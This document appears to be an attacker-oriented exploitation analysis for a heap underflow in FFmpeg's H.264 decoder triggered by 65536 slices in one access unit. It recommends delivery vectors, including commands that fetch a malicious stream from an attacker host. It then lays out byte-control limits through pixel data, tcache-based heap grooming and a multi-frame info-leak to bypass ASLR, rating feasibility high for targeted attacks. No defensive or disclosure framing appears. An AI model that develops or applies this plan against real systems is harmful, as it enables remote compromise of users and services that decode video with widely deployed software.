# Practical Exploitation Constraints Analysis

## 1. Delivery Mechanism for 65536 Slices

**Most reliable transport**: **Raw Annex B bytestream** delivered via:
- Direct file read (`.h264` file)
- Pipe/stdin input (`cat malicious.h264 | ffmpeg -i -`)
- RTSP/RTP stream (real-time transport)

**Why raw Annex B succeeds**:
- No container-level validation of slice count limits
- FFmpeg's `h264_parser` and `h264_decoder` process NAL units directly
- Bypasses MP4/MKV muxer sanity checks (e.g., `avformat` limits)

**Real-world parsing pipeline survival**:
1. **Raw file/pipe**: FFmpeg reads Annex B NALs directly → no intermediate filtering
2. **RTSP/RTP**: Uses RTP payload format for H.264 (RFC 6184), which carries Annex B NALs → decoder sees all slices
3. **HLS**: TS containers may impose packet size limits; some HLS implementations might drop or truncate
4. **WebRTC**: RTP transport similar to RTSP; depends on browser's WebRTC stack limits

**Recommended attack vector**: Create a malicious `.h264` file with 65536 slice NAL units in one access unit, feed to target via:
- Local file opening (e.g., `ffplay malicious.h264`)
- HTTP progressive download (e.g., `ffmpeg -i http://attacker/malicious.h264`)
- RTSP stream (e.g., `rtsp://attacker/malicious.h264`)

**Potential obstacles**:
- Some frontend parsers (like `libavformat`) might enforce internal limits
- Network buffers may fragment large NAL units
- **Best practice**: Use raw Annex B over TCP (RTSP) or HTTP to ensure delivery

## 2. Value Control via Pixel Data

**Constraints on written bytes**:
1. **Pixel value range**: 8-bit depth → 0-255 per byte; 10/12-bit → 0-1023/0-4095
2. **Quantization**: DCT coefficients are quantized → exact values may be rounded
3. **Prediction**: Intra/inter prediction uses reference pixels → values influenced by neighbors
4. **Entropy coding**: CAVLC/CABAC compress coefficients → cannot encode arbitrary sequences efficiently

**Attacker influence**:
- **Intra coding** (I-slices): Direct control over residual coefficients
- **Transform bypass**: Can disable transform for some macroblocks (lossless coding)
- **QP manipulation**: Set quantization parameter to minimum (QP=0) for near-lossless
- **Multiple attempts**: Can try different coefficient values to achieve target byte pattern

**Practical byte pattern control**:
- **Full 16-byte arbitrary pattern**: Unlikely due to quantization rounding
- **Partial pointer construction**: Possible by setting specific bytes across multiple underflow writes (3 offsets × 16 bytes = 48 total bytes controllable)
- **Metadata corruption**: Sufficient to overwrite chunk `size` field (8 bytes) or `fd`/`bk` pointers (16 bytes)
- **Function pointer partial overwrite**: May overwrite lower bytes of a pointer (ASLR entropy reduction)

**Worst-case for attacker**: Can only write values in limited range (e.g., 0-255). However:
- Heap addresses often have NULL bytes in upper bytes (0x00XXXXXX)
- Can write 0x00XXXXXX patterns by setting appropriate bytes
- Can combine multiple writes to construct full pointer across 48 bytes

**Assessment**: **Sufficient for exploitation** but requires careful bitstream engineering.

## 3. Multi-Frame Heap Grooming Strategy

`top_borders` allocation occurs in `ff_h264_frame_start`, called once per frame. Grooming must happen **before** the target frame decode.

**Step 1: Heap layout analysis**
1. Determine `top_borders` allocation size: `sizeof(uint8_t*) * mb_width` for pointers, plus aligned buffers
2. Identify typical allocation patterns during H.264 decoding:
   - `AVFrame` buffers (`data[]`, `buf[]`)
   - `AVCodecContext` internal structures
   - Motion vector tables, reference picture lists
   - Slice context arrays

**Step 2: Spray target objects**
1. Create many frames with specific dimensions to control allocation sizes
2. Allocate target objects (e.g., `AVBufferRef`, `AVFrame`, `AVCodecContext` internals) via:
   - Reference picture lists (short/long term references)
   - Motion vector buffers
   - Slice context allocations
3. Free selected objects to create "holes" at predictable addresses

**Step 3: Align `top_borders` allocation**
1. Force `top_borders` to allocate in a specific heap region by:
   - Fragmenting heap with many small allocations
   - Freeing blocks to create free chunks of exact size needed
   - Using `mb_width` to control allocation size
2. Place target object immediately before `top_borders`:
   - Allocate target object
   - Free intervening objects
   - Trigger `top_borders` allocation which consumes free space after target

**Step 4: Trigger underflow at precise moment**
1. Decode "grooming frames" to set up heap layout
2. Decode "attack frame" with 65536 slices
3. Ensure slice 65535's `mb_x == 0` occurs when `top_borders[top_idx]` points to groomed region

**Challenges**:
- **Heap ASLR**: Need to leak heap base first (see Alternative approach)
- **Nondeterminism**: Threading, malloc patterns vary across runs
- **Size matching**: Must match `top_borders` allocation size to free chunk size

**Improvement**: Use **tcache** (glibc ≥2.26) for more predictable behavior:
1. Fill tcache for size class matching `top_borders`
2. Free target chunk to tcache
3. Allocate `top_borders` from tcache (LIFO order places it after target)
4. Target object's data sits at -88 offset

## 4. Alternative: Heap Info-Leak Primitive

The XCHG primitive **reads 16 bytes** before writing. This can be used to **leak heap metadata**:

**Info-leak strategy**:
1. **First pass**: Use underflow to read chunk metadata (`prev_size`, `size`, `fd`, `bk`) at -88 offset
2. **Parse leaked pointers**: Calculate heap base, defeat ASLR
3. **Second pass**: Use leaked addresses to craft pointer values for write phase
4. **Iterate**: Multiple frames can perform read-then-write across different offsets

**Implementation details**:
- The read bytes become pixel values in border cache
- Attacker can extract them from decoded frame output
- Need to correlate underflow offset with leaked data

**Multi-stage exploit**:
```
Frame 1: Groom heap, trigger underflow READ at -88
         → Leak heap chunk metadata
Frame 2: Calculate target addresses based on leak
Frame 3: Groom heap with target object at known offset
Frame 4: Trigger underflow WRITE with crafted pointer
```

**Advantages**:
- No need for precise grooming before info-leak
- Can adapt to actual heap layout
- Works across multiple frames/iterations

**Limitations**:
- Requires attacker to extract pixel values from decoded output
- May need multiple attempts if read fails (crashes, invalid pointers)
- Timing sensitive: heap layout may change between read and write phases

**Feasibility**: **High** for targeted attacks. The read primitive provides ASLR bypass, making the write primitive much more reliable.